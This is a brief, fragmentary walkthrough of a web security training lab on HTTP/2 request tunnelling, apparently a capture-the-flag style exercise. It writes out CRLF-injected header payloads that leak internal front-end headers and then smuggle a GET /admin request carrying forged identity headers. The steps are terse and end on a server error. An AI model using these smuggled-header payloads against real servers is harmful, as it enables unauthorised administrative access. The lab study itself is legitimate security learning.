# **Bypassing access controls via HTTP/2 request tunnelling**

Task: This lab is vulnerable to request smuggling because the front-end server downgrades HTTP/2 requests and fails to adequately sanitize incoming header names. To solve the lab, access the admin panel at `/admin` as the `administrator` user and delete the user `carlos`.

The front-end server doesn't reuse the connection to the back-end, so isn't vulnerable to classic request smuggling attacks

Toolkit: BurpSuite, Browser

1. indicating a vulnerability

add header with random value  
X:x\\r\\n  
Host: [ee.com](http://ee.com)  
get 504 gateway time out, so works

2. take get req from search→turn to post→delete CL and search→add header with value of search

X: x  
Content-Length: 150

search=  
resp:                        \<h1\>0 search results for ': fffff  
cookie: session=j7IpizQcWmLEomJG5zx9LHN9cJ4ftrUN  
X-SSL-VERIFIED: 0  
X-SSL-CLIENT-CN: null  
X-FRONTEND-KEY: 1873743286779988  
Content-'\</h1\>

3. go to normal req, change to HEAD—\>add header with random value 

FF: ff\\r\\n  
\\r\\n  
GET /admin HTTP/1.1\\r\\n

X-SSL-CLIENT-CN: administrator\\r\\n  
X-FRONTEND-KEY: 1873743286779988\\r\\n  
\\r\\n

RESP: \<h1\>Server Error: Received only 3712 of expected 8380 bytes of data\</h1\>
